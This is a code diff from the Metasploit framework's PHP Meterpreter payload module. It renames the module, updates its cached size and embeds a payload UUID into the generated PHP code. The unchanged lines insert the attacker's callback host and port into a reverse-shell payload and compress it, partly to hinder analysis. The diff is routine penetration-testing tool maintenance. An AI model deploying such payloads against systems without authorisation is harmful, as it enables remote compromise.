@@ -9,9 +9,9 @@ require 'msf/base/sessions/meterpreter_php'
 require 'msf/base/sessions/meterpreter_options'
 
 
-module Metasploit3
+module Metasploit4
 
-  CachedSize = 24947
+  CachedSize = 25532
 
   include Msf::Payload::Single
   include Msf::Sessions::MeterpreterOptions
@@ -33,11 +33,18 @@ module Metasploit3
     met = File.open(file, "rb") {|f|
       f.read(f.stat.size)
     }
+
     met.gsub!("127.0.0.1", datastore['LHOST']) if datastore['LHOST']
     met.gsub!("4444", datastore['LPORT'].to_s) if datastore['LPORT']
 
-    # remove comments and compress whitespace to make it smaller and a
-    # bit harder to analyze
+    uuid = Msf::Payload::UUID.new(
+      platform: 'php',
+      arch:     ARCH_PHP
+    )
+
+    bytes = uuid.to_raw.chars.map { |c| '\x%.2x' % c.ord }.join('')
+    met = met.sub("\"PAYLOAD_UUID\", \"\"", "\"PAYLOAD_UUID\", \"#{bytes}\"")
+
     met.gsub!(/#.*$/, '')
     met = Rex::Text.compress(met)
     met
